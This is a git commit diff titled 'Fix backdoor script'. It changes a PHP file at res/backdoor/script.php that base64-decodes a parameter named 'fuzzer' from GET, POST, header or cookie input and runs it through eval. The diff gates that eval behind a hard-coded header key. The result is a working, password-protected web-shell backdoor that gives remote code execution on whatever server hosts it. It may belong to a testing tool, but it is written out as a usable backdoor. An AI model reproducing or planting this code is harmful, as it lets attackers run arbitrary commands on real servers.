96ca4f3138b4316b5072f186be3617b9a9639b2a
Vincent Rasquier <vrasquier@keley-live.com>
2016-10-28 16:59:26 +0200

    Fix backdoor script

--- res/backdoor/script.php
+++ res/backdoor/script.php
@@ -1,6 +1,8 @@
 <?php
 
 const PARAM = "fuzzer";
+const PARAM_KEY = "RAZBOYNIK_KEY";
+const RKEY = "FromRussiaWithLove<3";
 
 $g = $_GET;
 $p = $_POST;
@@ -11,6 +13,11 @@ $arr = [$g, $p, $h, $c];
 
 foreach ($arr as $i) {
 	if (isset($i[PARAM])) {
-		eval(base64_decode($i[PARAM]));
+		if ($h[PARAM_KEY] == RKEY) {
+			eval(base64_decode($i[PARAM]));
+		}
+
+		echo "Too bad";
 	}
 }
+
